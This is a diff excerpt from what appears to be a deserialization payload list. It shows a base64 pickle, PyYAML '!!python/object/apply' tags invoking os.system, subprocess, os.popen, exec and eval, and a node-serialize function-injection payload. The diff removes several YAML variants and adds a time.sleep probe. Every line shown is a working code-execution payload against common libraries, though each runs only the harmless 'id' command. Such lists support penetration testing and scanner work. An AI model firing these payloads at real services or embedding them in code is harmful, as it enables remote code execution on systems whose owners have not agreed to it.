@@ -91,18 +91,9 @@ gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==
 !!python/object/apply:os.system ['id']
 !!python/object/apply:subprocess.check_output [['id']]
 !!python/object/apply:os.popen ['id']
-!!python/object/new:str
-  args: ['test']
 !!python/object/apply:exec ['import os;os.system("id")']
 !!python/object/apply:eval ['__import__("os").system("id")']
-&ref
-!!python/object:__main__.Shell
-  cmd: id
-!!python/object/apply:os.system
-- id
-!!python/tuple
-- !!python/object/apply:os.popen
-  - id
+!!python/object/apply:time.sleep [3]
 
 # ── NODE.JS DESERIALIZATION ──
 {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}()"}
